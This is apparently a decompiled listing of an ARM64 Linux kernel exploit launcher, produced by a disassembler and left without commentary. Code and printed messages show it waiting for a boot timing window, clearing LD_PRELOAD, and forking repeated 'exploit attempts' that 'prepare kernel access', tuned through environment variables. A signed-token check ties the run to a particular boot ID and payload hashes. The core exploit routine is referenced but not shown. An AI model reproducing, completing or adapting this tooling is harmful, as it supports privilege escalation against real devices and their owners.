  pvVar12 = memchr(local_23b8,0x2e,local_23c0);
  if (pvVar12 == (void *)0x0) {
LAB_00109b0c:
    uVar26 = 0xfffffffd;
  }
  else {
    for (lVar27 = local_23c0 + ~((long)pvVar12 - (long)local_23b8);
        (lVar27 != 0 &&
        (*(char *)((long)pvVar12 + lVar27) == '\r' || *(char *)((long)pvVar12 + lVar27) == '\n'));
        lVar27 = lVar27 + -1) {
    }
    iVar6 = FUN_00109fa4(local_23b8,(long)pvVar12 - (long)local_23b8,auStack_2070,0x1fff,&local_23c8
                        );
    if (iVar6 == 0) goto LAB_00109b0c;
    iVar6 = FUN_00109fa4((long)pvVar12 + 1,lVar27,auStack_20b0,0x40,&local_23d0);
    lVar27 = local_23c8;
    uVar26 = 0xfffffffd;
    if ((iVar6 != 0) && (local_23d0 == 0x40)) {
      auStack_2070[local_23c8] = 0;
      pcStack_2400 = (code *)0x0;
      local_2408 = (code *)0x0;
      pcStack_23f0 = (code *)0x0;
      local_23f8 = (code *)0x0;
      pcStack_23e0 = (code *)0x0;
      local_23e8 = (code *)0x0;
      lVar13 = dlopen("libcrypto.so",2);
      local_2418 = lVar13;
      if (lVar13 == 0) {
        uVar26 = 0xfffffffc;
      }
      else {
        pcVar14 = (code *)dlsym(lVar13,"SHA256");
        local_23d8 = pcVar14;
        local_2410 = (code *)FUN_0010a3f4(pcVar14,"ED25519_verify");
        if (pcVar14 == (code *)0x0) {
          uVar26 = 0xfffffffc;
        }
        else {
          if (local_2410 == (code *)0x0) {
            pcVar17 = (code *)dlsym(lVar13,"EVP_PKEY_new_raw_public_key");
            local_2408 = pcVar17;
            pcVar18 = (code *)FUN_0010a3f4(pcVar17,"EVP_PKEY_free");
            pcStack_2400 = pcVar18;
            pcVar19 = (code *)FUN_0010a3f4(pcVar18,"EVP_MD_CTX_new");
            local_23f8 = pcVar19;
            pcVar20 = (code *)FUN_0010a3f4(pcVar19,"EVP_MD_CTX_free");
            pcStack_23f0 = pcVar20;
            pcVar21 = (code *)FUN_0010a3f4(pcVar20,"EVP_DigestVerifyInit");
            local_23e8 = pcVar21;
            pcVar22 = (code *)FUN_0010a3f4(pcVar21,"EVP_DigestVerify");
            uVar26 = 0xfffffffc;
            pcStack_23e0 = pcVar22;
            if ((((pcVar17 == (code *)0x0) || (pcVar18 == (code *)0x0)) || (pcVar19 == (code *)0x0))
               || (((pcVar20 == (code *)0x0 || (pcVar21 == (code *)0x0)) || (pcVar22 == (code *)0x0)
                   ))) goto LAB_00109ce8;
            lVar23 = (*pcVar17)(0x3b5,0,&DAT_001023de,0x20);
            lVar24 = (*pcVar19)();
            if ((lVar23 == 0) || (lVar24 == 0)) {
              bVar4 = false;
              bVar5 = false;
              if (lVar24 != 0) goto LAB_00109cc0;
            }
            else {
              iVar6 = (*pcVar21)(lVar24,0,0,0,lVar23);
              if (iVar6 == 1) {
                iVar6 = (*pcVar22)(lVar24,auStack_20b0,0x40,auStack_2070,lVar27);
                bVar5 = iVar6 == 1;
              }
              else {
                bVar5 = false;
              }
LAB_00109cc0:
              bVar4 = bVar5;
              (*pcVar20)(lVar24);
            }
            if (lVar23 != 0) {
              (*pcVar18)();
            }
            if (!bVar4) goto LAB_00109ce4;
          }
          else {
            iVar6 = (*local_2410)(auStack_2070,lVar27,auStack_20b0,&DAT_001023de);
            if (iVar6 != 1) {
LAB_00109ce4:
              uVar26 = 0xfffffffb;
              goto LAB_00109ce8;
            }
          }
          iVar6 = FUN_0010a070(auStack_2070,&DAT_00101bed,acStack_20d0,0x20);
          if ((((iVar6 == 0) ||
               (iVar6 = FUN_0010a070(auStack_2070,"boot_id",acStack_2120,0x50), iVar6 == 0)) ||
              (iVar6 = FUN_0010a070(auStack_2070,"profile_id",acStack_2271,0x101), iVar6 == 0)) ||
             (((iVar6 = FUN_0010a070(auStack_2070,&DAT_00102185,acStack_2291,0x20), iVar6 == 0 ||
               (iVar6 = FUN_0010a070(auStack_2070,"payload_sha256",auStack_22d2,0x41), iVar6 == 0))
              || (iVar6 = FUN_0010a070(auStack_2070,"root_sha256",auStack_2313,0x41), iVar6 == 0))))
          {
            uVar26 = 0xfffffffa;
          }
          else {
            local_2420 = (char *)0x0;
            piVar8 = (int *)__errno();
            *piVar8 = 0;
            lVar15 = strtoll(acStack_20d0,&local_2420,10);
            uVar26 = 0xfffffff9;
            if (((*piVar8 == 0) && (local_2420 != acStack_20d0)) &&
               ((*local_2420 == '\0' && (tVar16 = time((time_t *)0x0), tVar16 < lVar15)))) {
              iVar6 = strcmp(acStack_2271,__s2);
              if (iVar6 == 0) {
                iVar6 = strcmp(acStack_2291,__s2_00);
                if (iVar6 == 0) {
                  pcVar7 = getenv("GRKU_BOOT_ID");
                  if ((pcVar7 == (char *)0x0) || (*pcVar7 == '\0')) {
                    local_2358 = (void *)0x0;
                    local_23a0[0] = 0;
                    iVar6 = FUN_00109f28("/proc/sys/kernel/random/boot_id",0x80,&local_2358,
                                         local_23a0);
                    pvVar12 = local_2358;
                    if (iVar6 != 0) {
                      while (local_23a0[0] != 0) {
                        cVar2 = *(char *)((long)local_2358 + local_23a0[0] + -1);
                        if (cVar2 != '\r' && cVar2 != '\n') {
                          if (0xffffffffffffffb0 < local_23a0[0] - 0x50U) {
                            __memcpy_chk(acStack_2170,local_2358,local_23a0[0] + 1,0x50);
                            free(pvVar12);
                            goto LAB_00109d50;
                          }
                          break;
                        }
                        local_23a0[0] = local_23a0[0] + -1;
                        *(undefined1 *)((long)local_2358 + local_23a0[0]) = 0;
                      }
                      free(local_2358);
                    }
                  }
                  else {
                    sVar25 = strlen(pcVar7);
                    if (sVar25 < 0x50) {
                      __memcpy_chk(acStack_2170,pcVar7,sVar25 + 1,0x50);
LAB_00109d50:
                      iVar6 = strcmp(acStack_2120,acStack_2170);
                      if (iVar6 == 0) {
                        if ((int)uVar9 < 0) {
                          iVar6 = FUN_0010a204(&local_2418,pcVar10,&local_2358);
                          if (iVar6 != 0) {
LAB_00109eac:
                            iVar6 = FUN_0010a168(auStack_22d2,&local_2358);
                            if (iVar6 == 0) {
                              uVar26 = 0xfffffff2;
                            }
                            else {
                              iVar6 = FUN_0010a204(&local_2418,pcVar11,local_23a0);
                              if (iVar6 == 0) {
                                uVar26 = 0xfffffff3;
                              }
                              else {
                                iVar6 = FUN_0010a168(auStack_2313,local_23a0);
                                uVar26 = 0xfffffff1;
                                if (iVar6 != 0) {
                                  uVar26 = 1;
                                }
                              }
                            }
                            goto LAB_00109ce8;
                          }
                        }
                        else {
                          local_23b0 = 0;
                          local_23a8 = (void *)0x0;
                          iVar6 = FUN_0010a2e0(uVar9 & 0xffffffff,0x800000,&local_23a8,&local_23b0);
                          if (iVar6 != 0) {
                            lVar27 = (*pcVar14)(local_23a8,local_23b0,local_23a0);
                            free(local_23a8);
                            if (lVar27 != 0) {
                              lVar27 = 0;
                              pcVar7 = (char *)((long)&local_2358 + 1);
                              do {
                                pbVar1 = (byte *)((long)local_23a0 + lVar27);
                                lVar27 = lVar27 + 1;
                                cVar2 = "0123456789abcdef"[(ulong)*pbVar1 & 0xf];
                                pcVar7[-1] = "0123456789abcdef"[*pbVar1 >> 4];
                                *pcVar7 = cVar2;
                                pcVar7 = pcVar7 + 2;
                              } while (lVar27 != 0x20);
                              local_2318 = 0;
                              goto LAB_00109eac;
                            }
                          }
                        }
                        uVar26 = 0xfffffff4;
                      }
                      else {
                        uVar26 = 0xfffffff5;
                      }
                      goto LAB_00109ce8;
                    }
                  }
                  uVar26 = 0xfffffff6;
                }
                else {
                  uVar26 = 0xfffffff7;
                }
              }
              else {
                uVar26 = 0xfffffff8;
              }
            }
          }
        }
LAB_00109ce8:
        dlclose(lVar13);
      }
    }
  }
  free(local_23b8);
LAB_00109b20:
  if (*(long *)(lVar3 + 0x28) == local_70) {
    return uVar26;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



// ==== FUN_00109f28 @ 00109f28 size=124 ====

undefined4 FUN_00109f28(char *param_1,undefined8 param_2,long param_3,long param_4)

{
  undefined4 uVar1;
  undefined8 uVar2;
  
  if ((((param_1 != (char *)0x0) && (param_4 != 0)) && (param_3 != 0)) && (*param_1 != '\0')) {
    uVar2 = __open_2(param_1,0x88000);
    if (-1 < (int)uVar2) {
      uVar1 = FUN_0010a2e0(uVar2,param_2,param_3,param_4);
      close((int)uVar2);
      return uVar1;
    }
  }
  return 0;
}



// ==== FUN_00109fa4 @ 00109fa4 size=204 ====

undefined8 FUN_00109fa4(byte *param_1,long param_2,long param_3,ulong param_4,ulong *param_5)

{
  byte bVar1;
  ulong uVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  
  uVar2 = 0;
  if (param_2 != 0) {
    uVar4 = 0;
    uVar3 = 0;
    do {
      bVar1 = *param_1;
      uVar5 = bVar1 - 0x41;
      if (uVar5 < 0x1a) {
LAB_00109fd8:
        if ((int)uVar5 < 0) {
          return 0;
        }
      }
      else {
        uVar6 = (uint)bVar1;
        if (bVar1 - 0x61 < 0x1a) {
          uVar5 = uVar6 - 0x47;
          goto LAB_00109fd8;
        }
        if (uVar6 - 0x30 < 10) {
          uVar5 = uVar6 + 4;
        }
        else {
          uVar5 = 0x3f;
          if (uVar6 != 0x5f) {
            uVar5 = 0xffffffff;
          }
          if (uVar6 != 0x2d) goto LAB_00109fd8;
          uVar5 = 0x3e;
        }
      }
      uVar3 = uVar5 | uVar3 << 6;
      if ((int)uVar4 < 2) {
        uVar4 = uVar4 + 6;
      }
      else {
        if (param_4 <= uVar2) {
          return 0;
        }
        *(char *)(param_3 + uVar2) = (char)(uVar3 >> (ulong)(uVar4 - 2 & 0x1f));
        uVar2 = uVar2 + 1;
        uVar4 = uVar4 - 2;
      }
      param_2 = param_2 + -1;
      param_1 = param_1 + 1;
    } while (param_2 != 0);
    if ((0 < (int)uVar4) && ((uVar3 & (-1 << (ulong)(uVar4 & 0x1f) ^ 0xffffffffU)) != 0)) {
      return 0;
    }
  }
  *param_5 = uVar2;
  return 1;
}



// ==== FUN_0010a070 @ 0010a070 size=248 ====

undefined8 FUN_0010a070(char *param_1,char *param_2,void *param_3,ulong param_4)

{
  ulong __n;
  int iVar1;
  size_t __n_00;
  char *pcVar2;
  size_t sVar3;
  
  __n_00 = strlen(param_2);
  if (*param_1 != '\0') {
    do {
      pcVar2 = strchr(param_1,10);
      if (pcVar2 == (char *)0x0) {
        sVar3 = strlen(param_1);
        pcVar2 = param_1 + sVar3;
      }
      if (((__n_00 + 1 < (ulong)((long)pcVar2 - (long)param_1)) &&
          (iVar1 = memcmp(param_1,param_2,__n_00), iVar1 == 0)) && (param_1[__n_00] == '=')) {
        __n = ((long)pcVar2 - (long)param_1) + ~__n_00;
        if (__n == 0) {
          return 0;
        }
        if (param_4 <= __n) {
          return 0;
        }
        memcpy(param_3,param_1 + __n_00 + 1,__n);
        *(undefined1 *)((long)param_3 + __n) = 0;
        return 1;
      }
      param_1 = pcVar2;
      if (*pcVar2 != '\0') {
        param_1 = pcVar2 + 1;
      }
    } while (*param_1 != '\0');
  }
  return 0;
}



// ==== FUN_0010a168 @ 0010a168 size=156 ====

bool FUN_0010a168(char *param_1,char *param_2)

{
  uint uVar1;
  byte *pbVar2;
  undefined1 auVar3 [16];
  bool bVar4;
  size_t sVar5;
  long lVar6;
  ulong uVar7;
  byte bVar8;
  byte bVar9;
  byte bVar10;
  byte bVar11;
  byte bVar12;
  byte bVar13;
  byte bVar14;
  byte bVar15;
  byte bVar16;
  byte bVar17;
  byte bVar18;
  byte bVar19;
  byte bVar20;
  byte bVar21;
  byte bVar22;
  byte bVar23;
  undefined1 auVar24 [16];
  undefined8 uVar25;
  undefined8 uVar26;
  
  bVar4 = false;
  if ((param_1 != (char *)0x0) && (param_2 != (char *)0x0)) {
    sVar5 = strlen(param_1);
    if ((sVar5 == 0x40) && (sVar5 = strlen(param_2), sVar5 == 0x40)) {
      bVar8 = 0;
      bVar9 = 0;
      bVar10 = 0;
      bVar11 = 0;
      bVar12 = 0;
      bVar13 = 0;
      bVar14 = 0;
      bVar15 = 0;
      bVar16 = 0;
      bVar17 = 0;
      bVar18 = 0;
      bVar19 = 0;
      bVar20 = 0;
      bVar21 = 0;
      bVar22 = 0;
      bVar23 = 0;
      lVar6 = 0;
      do {
        pbVar2 = (byte *)(param_1 + lVar6);
        uVar26 = *(undefined8 *)(param_2 + lVar6 + 8);
        uVar25 = *(undefined8 *)(param_2 + lVar6);
        lVar6 = lVar6 + 0x10;
        bVar8 = (byte)uVar25 ^ *pbVar2 | bVar8;
        bVar9 = (byte)((ulong)uVar25 >> 8) ^ pbVar2[1] | bVar9;
        bVar10 = (byte)((ulong)uVar25 >> 0x10) ^ pbVar2[2] | bVar10;
        bVar11 = (byte)((ulong)uVar25 >> 0x18) ^ pbVar2[3] | bVar11;
        bVar12 = (byte)((ulong)uVar25 >> 0x20) ^ pbVar2[4] | bVar12;
        bVar13 = (byte)((ulong)uVar25 >> 0x28) ^ pbVar2[5] | bVar13;
        bVar14 = (byte)((ulong)uVar25 >> 0x30) ^ pbVar2[6] | bVar14;
        bVar15 = (byte)((ulong)uVar25 >> 0x38) ^ pbVar2[7] | bVar15;
        bVar16 = (byte)uVar26 ^ pbVar2[8] | bVar16;
        bVar17 = (byte)((ulong)uVar26 >> 8) ^ pbVar2[9] | bVar17;
        bVar18 = (byte)((ulong)uVar26 >> 0x10) ^ pbVar2[10] | bVar18;
        bVar19 = (byte)((ulong)uVar26 >> 0x18) ^ pbVar2[0xb] | bVar19;
        bVar20 = (byte)((ulong)uVar26 >> 0x20) ^ pbVar2[0xc] | bVar20;
        bVar21 = (byte)((ulong)uVar26 >> 0x28) ^ pbVar2[0xd] | bVar21;
        bVar22 = (byte)((ulong)uVar26 >> 0x30) ^ pbVar2[0xe] | bVar22;
        bVar23 = (byte)((ulong)uVar26 >> 0x38) ^ pbVar2[0xf] | bVar23;
      } while (lVar6 != 0x40);
      auVar24[1] = bVar9;
      auVar24[0] = bVar8;
      auVar24[2] = bVar10;
      auVar24[3] = bVar11;
      auVar24[4] = bVar12;
      auVar24[5] = bVar13;
      auVar24[6] = bVar14;
      auVar24[7] = bVar15;
      auVar24[8] = bVar16;
      auVar24[9] = bVar17;
      auVar24[10] = bVar18;
      auVar24[0xb] = bVar19;
      auVar24[0xc] = bVar20;
      auVar24[0xd] = bVar21;
      auVar24[0xe] = bVar22;
      auVar24[0xf] = bVar23;
      auVar3[1] = bVar9;
      auVar3[0] = bVar8;
      auVar3[2] = bVar10;
      auVar3[3] = bVar11;
      auVar3[4] = bVar12;
      auVar3[5] = bVar13;
      auVar3[6] = bVar14;
      auVar3[7] = bVar15;
      auVar3[8] = bVar16;
      auVar3[9] = bVar17;
      auVar3[10] = bVar18;
      auVar3[0xb] = bVar19;
      auVar3[0xc] = bVar20;
      auVar3[0xd] = bVar21;
      auVar3[0xe] = bVar22;
      auVar3[0xf] = bVar23;
      auVar24 = NEON_ext(auVar24,auVar3,8,1);
      uVar7 = CONCAT17(bVar15 | auVar24[7],
                       CONCAT16(bVar14 | auVar24[6],
                                CONCAT15(bVar13 | auVar24[5],
                                         CONCAT14(bVar12 | auVar24[4],
                                                  CONCAT13(bVar11 | auVar24[3],
                                                           CONCAT12(bVar10 | auVar24[2],
                                                                    CONCAT11(bVar9 | auVar24[1],
                                                                             bVar8 | auVar24[0])))))
                               ));
      uVar7 = uVar7 | uVar7 >> 0x20;
      uVar1 = (uint)uVar7 | (uint)(uVar7 >> 0x10);
      bVar4 = ((uVar1 | uVar1 >> 8) & 0xff) == 0;
    }
    else {
      bVar4 = false;
    }
  }
  return bVar4;
}



// ==== FUN_0010a204 @ 0010a204 size=220 ====

void FUN_0010a204(long param_1,undefined8 param_2,long param_3)

{
  byte bVar1;
  long lVar2;
  undefined8 uVar3;
  long lVar4;
  char *pcVar5;
  undefined8 local_68;
  void *local_60;
  byte local_58 [32];
  long local_38;
  
  lVar2 = tpidr_el0;
  local_38 = *(long *)(lVar2 + 0x28);
  local_68 = 0;
  local_60 = (void *)0x0;
  uVar3 = FUN_00109f28(param_2,0x800000,&local_60,&local_68);
  if ((int)uVar3 != 0) {
    lVar4 = (**(code **)(param_1 + 0x40))(local_60,local_68,local_58);
    free(local_60);
    if (lVar4 == 0) {
      uVar3 = 0;
    }
    else {
      lVar4 = 0;
      pcVar5 = (char *)(param_3 + 1);
      do {
        bVar1 = local_58[lVar4];
        lVar4 = lVar4 + 1;
        pcVar5[-1] = "0123456789abcdef"[bVar1 >> 4];
        *pcVar5 = "0123456789abcdef"[(ulong)bVar1 & 0xf];
        pcVar5 = pcVar5 + 2;
      } while (lVar4 != 0x20);
      uVar3 = 1;
      *(undefined1 *)(param_3 + 0x40) = 0;
    }
  }
  if (*(long *)(lVar2 + 0x28) == local_38) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail(uVar3);
}



// ==== FUN_0010a2e0 @ 0010a2e0 size=276 ====

void FUN_0010a2e0(int param_1,ulong param_2,undefined8 *param_3,ulong *param_4)

{
  long lVar1;
  int iVar2;
  undefined8 uVar3;
  void *__ptr;
  long lVar4;
  int *piVar5;
  ulong uVar6;
  uint local_c8;
  ulong local_a8;
  long local_58;
  
  uVar3 = 0;
  lVar1 = tpidr_el0;
  local_58 = *(long *)(lVar1 + 0x28);
  if ((param_3 != (undefined8 *)0x0) && (param_4 != (ulong *)0x0)) {
    iVar2 = fstat(param_1,(stat *)&stack0xffffffffffffff28);
    if ((iVar2 == 0) &&
       (((local_c8 & 0xf000) == 0x8000 && 0 < (long)local_a8) && local_a8 <= param_2)) {
      __ptr = malloc(local_a8 + 1);
      uVar3 = 0;
      if (__ptr != (void *)0x0) {
        uVar6 = 0;
        do {
          lVar4 = __pread_chk(param_1,(long)__ptr + uVar6,local_a8 - uVar6,uVar6,0xffffffffffffffff)
          ;
          if (lVar4 < 0) {
            piVar5 = (int *)__errno();
            if (*piVar5 != 4) goto LAB_0010a3b8;
          }
          else {
            if (lVar4 == 0) {
LAB_0010a3b8:
              free(__ptr);
              goto LAB_0010a3c0;
            }
            uVar6 = lVar4 + uVar6;
          }
        } while (uVar6 < local_a8);
        uVar3 = 1;
        *(undefined1 *)((long)__ptr + uVar6) = 0;
        *param_3 = __ptr;
        *param_4 = uVar6;
      }
    }
    else {
LAB_0010a3c0:
      uVar3 = 0;
    }
  }
  if (*(long *)(lVar1 + 0x28) == local_58) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail(uVar3);
}



// ==== FUN_0010a3f4 @ 0010a3f4 size=8 ====

void FUN_0010a3f4(void)

{
  dlsym();
  return;
}



// ==== FUN_0010a3fc @ 0010a3fc size=68 ====

void FUN_0010a3fc(undefined8 param_1)

{
  long lVar1;
  
  lVar1 = DAT_0010ea78;
  if (DAT_0010ea78 != 0) {
    *(undefined8 *)(DAT_0010ea78 + 0x10) = DAT_0010d980;
    *(undefined8 *)(lVar1 + 0x18) = DAT_0010d988;
    *(undefined8 *)(lVar1 + 8) = param_1;
    *(undefined4 *)(lVar1 + 4) = 1;
  }
  return;
}



// ==== _INIT_2 @ 0010a440 size=1400 ====

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void _INIT_2(void)

{
  uint uVar1;
  long lVar2;
  undefined *puVar3;
  __time_t _Var4;
  __time_t _Var5;
  bool bVar6;
  int iVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  __pid_t _Var11;
  int iVar12;
  __pid_t _Var13;
  __pid_t _Var14;
  int iVar15;
  char *pcVar16;
  int *piVar17;
  long lVar18;
  FILE *__stream;
  ulong uVar19;
  undefined8 uVar20;
  uint uVar21;
  undefined8 uVar22;
  timespec local_d8;
  uint local_c4;
  undefined1 auStack_c0 [24];
  timespec local_a8;
  undefined1 auStack_90 [16];
  undefined *local_80;
  undefined8 uStack_78;
  long local_68;
  
  lVar2 = tpidr_el0;
  local_68 = *(long *)(lVar2 + 0x28);
  if ((DAT_0010ea70 & 1) != 0) {
LAB_0010a87c:
    if (*(long *)(lVar2 + 0x28) == local_68) {
      return;
    }
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  FUN_00109734();
  DAT_0010ea70 = 1;
  iVar7 = setvbuf(*(FILE **)PTR_stdin_0010c2d0,(char *)0x0,2,0);
  puVar3 = PTR_stderr_0010c2c8;
  if (iVar7 != -1) {
    iVar7 = setvbuf(*(FILE **)PTR_stdout_0010c2d8,(char *)0x0,2,0);
    __stream = *(FILE **)puVar3;
    if (iVar7 == -1) goto LAB_0010a974;
    iVar7 = setvbuf(__stream,(char *)0x0,2,0);
    if ((iVar7 != -1) && (iVar7 = clock_gettime(7,&local_a8), iVar7 != -1)) {
      if (local_a8.tv_sec < 0x78) {
        uVar19 = 0x78 - local_a8.tv_sec;
        printf("\x1b[33m[*] \x1b[0mwaiting for boot allocator quiet window seconds=%lld\n",uVar19);
        do {
          uVar8 = sleep((uint)uVar19);
          uVar19 = (ulong)uVar8;
        } while (uVar8 != 0);
      }
      uVar9 = FUN_0010a9d8("EXPLOIT_ATTEMPTS",8,1,0x40);
      iVar7 = FUN_0010a9d8("PSELECT_DELAY_USEC",20000,0,1000000);
      uVar10 = FUN_0010a9d8("EXPLOIT_ATTEMPT_TIMEOUT_SEC",0x5a,5,900);
      uVar8 = FUN_0010a9d8("P0_ATTEMPT_TIMEOUT_SEC",0x14,5,(ulong)uVar10);
      if (uVar10 <= uVar8) {
        uVar8 = uVar10;
      }
      pcVar16 = getenv("SLIDE_ONLY");
      if (pcVar16 != (char *)0x0) {
        uVar9 = 1;
      }
      DAT_0010ea78 = mmap((void *)0x0,0x20,3,0x21,-1,0);
      if (DAT_0010ea78 != (int *)0xffffffffffffffff) {
        unsetenv("LD_PRELOAD");
        uStack_78 = _UNK_0010c108;
        local_80 = PTR_s_preload_so_0010c100;
        printf("\x1b[33m[*] \x1b[0mstarting exploit attempts=%d\n",(ulong)uVar9);
        if (uVar9 != 0) {
          uVar21 = 1;
LAB_0010a648:
          FUN_0010aa98(&DAT_00101f90);
          _Var11 = fork();
          if (_Var11 == 0) {
            iVar12 = (&DAT_0010243c)[(int)(uVar21 - 1) % 8];
            puts("\x1b[33m[*] \x1b[0mstage=preparing-kernel-access");
            iVar15 = prctl(1,9);
            if (iVar15 != -1) {
              _Var11 = getppid();
              if (_Var11 == 1) {
                    /* WARNING: Subroutine does not return */
                _exit(1);
              }
              FUN_00109598(&local_a8,0x10,0x10,&DAT_0010203b,
                           iVar12 + iVar7 & (iVar12 + iVar7 >> 0x1f ^ 0xffffffffU));
              iVar7 = FUN_0010aaa4("PSELECT_DELAY_USEC",&local_a8);
              if (iVar7 != -1) {
                FUN_00109598(auStack_c0,0x10,0x10,&DAT_0010203b,uVar21);
                iVar7 = FUN_0010aaa4("S23_SUPERVISOR_ATTEMPT",auStack_c0);
                if (iVar7 != -1) {
                  getenv("SLIDE_P0_OFFSET");
                  iVar7 = FUN_001044f4(1,&local_80);
                    /* WARNING: Subroutine does not return */
                  _exit(iVar7);
                }
              }
            }
          }
          else if (_Var11 != -1) {
            local_c4 = 0;
            iVar12 = clock_gettime(1,&local_d8);
            if (iVar12 != -1) {
              while (_Var13 = waitpid(_Var11,(int *)&local_c4,1), _Var14 = _Var11, _Var13 != _Var11)
              {
                if (((_Var13 < 0) && (piVar17 = (int *)__errno(), *piVar17 != 4)) ||
                   (iVar12 = clock_gettime(1,&local_a8), _Var5 = local_a8.tv_sec,
                   _Var4 = local_d8.tv_sec, iVar12 == -1)) goto LAB_0010a968;
                lVar18 = FUN_0010aaac();
                uVar19 = (ulong)uVar10;
                if (lVar18 == 0) {
                  uVar1 = uVar8;
                  if (DAT_0010ea78[1] != 0) {
                    uVar1 = uVar10;
                  }
                  uVar19 = (ulong)uVar1;
                }
                if ((long)uVar19 <= _Var5 - _Var4) {
                  iVar12 = kill(_Var11,9);
                  if (iVar12 != -1) goto LAB_0010a840;
                  goto LAB_0010a968;
                }
                usleep(100000);
              }
              goto LAB_0010a708;
            }
          }
        }
LAB_0010a968:
        __stream = *(FILE **)PTR_stderr_0010c2c8;
        goto LAB_0010a974;
      }
    }
  }
  __stream = *(FILE **)puVar3;
LAB_0010a974:
  fwrite(&DAT_00102155,0x1e,1,__stream);
                    /* WARNING: Subroutine does not return */
  exit(-1);
  while (piVar17 = (int *)__errno(), *piVar17 == 4) {
LAB_0010a840:
    _Var14 = waitpid(_Var11,(int *)&local_c4,0);
    if (-1 < _Var14) break;
  }
LAB_0010a708:
  if (_Var14 < 0) goto LAB_0010a968;
  if ((_Var14 == _Var11) && ((local_c4 & 0xff7f) == 0)) {
    FUN_0010aa98(&DAT_00101e61);
    goto LAB_0010a87c;
  }
  lVar18 = FUN_0010aaac();
  if ((lVar18 == 0) && (DAT_0010ea78[1] != 0)) {
    uVar20 = *(undefined8 *)(DAT_0010ea78 + 4);
    uVar22 = *(undefined8 *)(DAT_0010ea78 + 6);
    FUN_00109598(auStack_90,0x10,0x10,"0x%zx",*(undefined8 *)(DAT_0010ea78 + 2));
    FUN_00109598(&local_a8,0x18,0x18,"0x%zx",uVar20);
    FUN_00109598(auStack_c0,0x18,0x18,"0x%zx",uVar22);
    iVar12 = FUN_0010aaa4("SLIDE_P0_OFFSET",auStack_90);
    if (((iVar12 == -1) || (iVar12 = FUN_0010aaa4("P0_GATE_PAGE_STRUCT",&local_a8), iVar12 == -1))
       || (iVar12 = FUN_0010aaa4("P0_PROBE_PAGE_STRUCT",auStack_c0), iVar12 == -1))
    goto LAB_0010a968;
  }
  else {
    lVar18 = FUN_0010aaac();
    if ((lVar18 == 0) && (*DAT_0010ea78 != 0)) goto LAB_0010a968;
  }
  FUN_0010aa98(&DAT_00101b77);
  if (uVar21 < uVar9) {
    sleep(5);
  }
  bVar6 = uVar21 == uVar9;
  uVar21 = uVar21 + 1;
  if (bVar6) goto LAB_0010a968;
  goto LAB_0010a648;
}



// ==== FUN_0010a9d8 @ 0010a9d8 size=192 ====

undefined4 FUN_0010a9d8(char *param_1,undefined4 param_2,uint param_3,uint param_4)

{
  long lVar1;
  char *__nptr;
  int *piVar2;
  long lVar3;
  char *local_50;
  long local_48;
  
  lVar1 = tpidr_el0;
  local_48 = *(long *)(lVar1 + 0x28);
  __nptr = getenv(param_1);
  if ((__nptr != (char *)0x0) && (*__nptr != '\0')) {
    local_50 = (char *)0x0;
    piVar2 = (int *)__errno();
    *piVar2 = 0;
    lVar3 = strtol(__nptr,&local_50,0);
    if ((*piVar2 == 0) &&
       ((local_50 != __nptr &&
        ((lVar3 <= (long)(ulong)param_4 && (long)(ulong)param_3 <= lVar3) && *local_50 == '\0')))) {
      param_2 = (undefined4)lVar3;
    }
  }
  if (*(long *)(lVar1 + 0x28) == local_48) {
    return param_2;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



// ==== FUN_0010aa98 @ 0010aa98 size=12 ====

int FUN_0010aa98(char *param_1)

{
  int iVar1;
  uint unaff_w21;
  uint unaff_w22;
  
  iVar1 = printf(param_1,(ulong)unaff_w21,(ulong)unaff_w22);
  return iVar1;
}



// ==== FUN_0010aaa4 @ 0010aaa4 size=8 ====

int FUN_0010aaa4(char *param_1,char *param_2)

{
  int iVar1;
  
  iVar1 = setenv(param_1,param_2,1);
  return iVar1;
}



// ==== FUN_0010aaac @ 0010aaac size=8 ====

void FUN_0010aaac(void)

{
  char *unaff_x24;
  
  getenv(unaff_x24);
  return;
}



// ==== FUN_0010aac0 @ 0010aac0 size=20 ====

void FUN_0010aac0(void)

{
  (*(code *)PTR_0010c2f0)();
  return;
}



